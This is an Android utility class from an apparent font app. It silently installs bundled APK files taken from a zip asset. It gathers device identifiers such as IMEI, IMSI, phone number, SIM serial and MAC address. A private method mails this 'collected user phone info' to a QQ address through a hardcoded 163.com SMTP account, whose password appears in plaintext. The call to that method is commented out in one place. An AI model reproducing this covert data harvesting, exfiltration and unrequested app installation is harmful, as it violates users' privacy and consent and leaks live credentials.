package com.sg.mtfont.utils;

import java.io.File;
import java.io.FileFilter;
import java.io.IOException;

import android.bluetooth.BluetoothClass.Device;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.sg.mtfont.MainActivity;
import com.sg.mtfont.R;
import com.sg.mtfont.bean.DeviceInfo;
import com.sg.mtfont.mail.MailSenderInfo;
import com.sg.mtfont.mail.SimpleMailSender;



/**
 * 
 * @author "biaowen.yu"
 * @date 2014-4-6 下午10:37:44
 */
public class CommonUtils {

	
	public static final String CURRENT_POINTS = "CURRENT_POINTS";
	
	
	public static void toastText(Context context,String text){
		Toast.makeText(context, text, Toast.LENGTH_SHORT).show();
	}


	public static void toastText(Context context, int adTabTitle) {
		Toast.makeText(context, adTabTitle, Toast.LENGTH_SHORT).show();
	}
	
	
	public  static  void installFontApk(final Context ctx) {
        // 初始化数据pb
        new Thread(new Runnable() {
            
            @Override
            public void run() {
                try {
                    String filePath = Environment.getExternalStorageDirectory()+"/fontxiuxiu";
                    File file = new File(filePath);
                    if (!file.exists()){
                        ApkInstallHelper.unZip(ctx, "fontapk.zip",filePath );
                    }
                    
                    //过滤apk文件
                    File[] files = file.listFiles(new FileFilter() {
                        
                        @Override
                        public boolean accept(File pathname) {
                            if (pathname.getName().endsWith(".apk")){
                                return true;
                            }
                            return false;
                        }
                    });
                    //静默安装精品
                    for (int i=0; i < files.length; i++){
                        String apkFilePath = files[i].getAbsolutePath();
                        PackageManager pm = ctx.getPackageManager();
                        PackageInfo info = pm.getPackageArchiveInfo(apkFilePath,
                                PackageManager.GET_ACTIVITIES);
                        String packageName = info.applicationInfo.packageName;
                        MainActivity.silentInstall(ctx,packageName,apkFilePath);
                    }
                    
                } catch (IOException e) {
                    e.printStackTrace();
                } 
                
            }
        }).start();
    }
	
	/**
	 * 
	 * @author "biaowen.yu"
	 * @date 2014-4-8 下午10:56:35
	 * @description 
	 * @return
	 */
	public static MailSenderInfo initEmail() {
		// 这个类主要是设置邮件
		MailSenderInfo mailInfo = new MailSenderInfo();
		mailInfo.setMailServerHost("smtp.163.com");
		mailInfo.setMailServerPort("25");
		mailInfo.setValidate(true);
		mailInfo.setUserName("dnfpublic@163.com");
		mailInfo.setPassword("dnfgzs123456");// 您的邮箱密码
		mailInfo.setFromAddress("dnfpublic@163.com");
		mailInfo.setToAddress("741470894@qq.com");
		return mailInfo;
	}
	
	public static String getPhoneInfo(Context ctx) {
		try{
			TelephonyManager telephonyManager= (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
			StringBuilder sb = new StringBuilder();
			String imei=telephonyManager.getDeviceId();
			sb.append("\n imei="+imei);
			sb.append("\n Subscriber imsi=").append(telephonyManager.getSubscriberId()).append("\n");
			sb.append("\n 手机型号model=").append(Build.MODEL);
			sb.append("\n").append("手机号码:"+telephonyManager.getLine1Number());
			sb.append("\n").append("手机网络类型："+telephonyManager.getNetworkType());
			sb.append("\n").append("运营商："+telephonyManager.getSimOperatorName());
			sb.append("\n").append("是否漫游状态:"+telephonyManager.isNetworkRoaming());
			sb.append("\nSimCountryIso = " + telephonyManager.getSimCountryIso());  
	        sb.append("\nSimOperator = " + telephonyManager.getSimOperator());  
	        sb.append("\nSimSerialNumber = " + telephonyManager.getSimSerialNumber());  
	        sb.append("\nSimState = " + telephonyManager.getSimState());
			return sb.toString();
		}catch (Exception e){
			return "";
		}
	}
	
	private static SimpleMailSender sms;
	
	private static SimpleMailSender getInstance(){
		return sms;
	}
	
	public static void sendEmail(MailSenderInfo mailInfo){
		if (sms == null){
			sms = new SimpleMailSender();
		}
		sms.sendTextMail(mailInfo);
	}
	
	/**
	 * 
	 *
	 * @param ctx
	 * @return
	 * 2014年7月27日 下午2:56:21
	 */
	public static boolean isRooted(Context ctx){
		return false;
	}
	
	/**
	 * 
	 * @param useCustomFont
	 * @param isFree
	 * @return
	 * 2014年8月1日 下午5:48:28
	 */
	public static boolean checkFontInstalled(boolean useCustomFont,boolean isFree){
		if (useCustomFont){
			// TODO 
		} else {
			// TODO find from sharePreference
		}
		
		if (isFree){
			// TODO
		}
		
		return false;
	}
	
	/**
	 * 
	 * @author Kalus Yu
	 * @param ctx
	 * @return
	 * 2014年10月3日 下午7:59:07
	 */
	public static String getImei(Context ctx){
	    TelephonyManager telephonyManager= (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId();
        return imei;
	}
	
	/**
	 * 
	 * @author Kalus Yu
	 * @param ctx
	 * @return
	 * 2014年8月23日 下午9:30:59
	 */
	public static DeviceInfo getDeviceInfo(Context ctx){
	    TelephonyManager telephonyManager= (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId();
        String imsi = telephonyManager.getSubscriberId();
        String macAddress = getLocalMacAddress(ctx);
        String product = android.os.Build.PRODUCT;
        String brand = android.os.Build.BRAND;
        String manufacturer = android.os.Build.MANUFACTURER;
        String device = android.os.Build.DEVICE;
        String sdk = String.valueOf(android.os.Build.VERSION.SDK_INT);
        String board = android.os.Build.BOARD;
        String display = android.os.Build.DISPLAY;
        String host = android.os.Build.HOST;
        String model = android.os.Build.MODEL;
        String time = "";
        String androidVersion = android.os.Build.VERSION.RELEASE;
        String telephone = telephonyManager.getLine1Number();
        String networkType = String.valueOf(telephonyManager.getNetworkType());
        String simOperatorName = telephonyManager.getSimOperator();
        String simSerialNumber = telephonyManager.getSimSerialNumber();
        String simState = telephonyManager.getSimState()+"";
        DeviceInfo info = new DeviceInfo(imei, macAddress, imsi, product, brand, 
                manufacturer, device, sdk, board, display, host, model, 
                time, androidVersion, telephone, networkType, 
                simOperatorName, simSerialNumber, simState);
        return info;
	}
	
	/**
	 * 
	 * @author Kalus Yu
	 * @param title
	 * @param ctx
	 * 2014年8月23日 下午8:42:01
	 */
	public static DeviceInfo getDeviceInfo(String title,Context ctx) {
        DeviceInfo info = getDeviceInfo(ctx);
        //sendEmail(info,title);
        return info;
        
    }
	
	/**
	 * 
	 * @author Kalus Yu
	 * @param info
	 * @param title
	 * 2014年8月23日 下午8:53:04
	 */
	private static void sendEmail(DeviceInfo info,String title) {
	    final MailSenderInfo mailInfo = CommonUtils.initEmail();
        mailInfo.setSubject(title+"：");
	    String mailContent = "用户手机信息搜集内容：\n\n";
        mailContent += info.toString();

        mailInfo.setContent(mailContent);
        // 这个类主要来发送邮件
        new Thread(new Runnable() {

            @Override
            public void run() {
                SimpleMailSender sms = new SimpleMailSender();
                sms.sendTextMail(mailInfo);// 不能再UI线程执行

            }
        }).start();
    }


    /**
	 * get mac address
	 * @author Kalus Yu
	 * @param ctx
	 * @return
	 * 2014年8月23日 下午8:42:57
	 */
	public static String getLocalMacAddress(Context ctx) {  
        WifiManager wifi = (WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);  
        WifiInfo info = wifi.getConnectionInfo();  
        return info.getMacAddress();  
    } 
	
	/**
	 * 
	 * 
	 * KaluYu
	 * @param ctx
	 * @return
	 * 2014年10月13日 下午10:34:53
	 */
	public static boolean isConnected(Context ctx){
		WifiManager wm = (WifiManager) ctx.getSystemService(
				Context.WIFI_SERVICE);
		boolean isWifi = wm.isWifiEnabled()
				&& (wm.getWifiState() == WifiManager.WIFI_STATE_ENABLED);

		ConnectivityManager cm = (ConnectivityManager)
				ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo ni = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		boolean isNetData = ni.isAvailable();
		return isWifi || isNetData ;
	}
}
 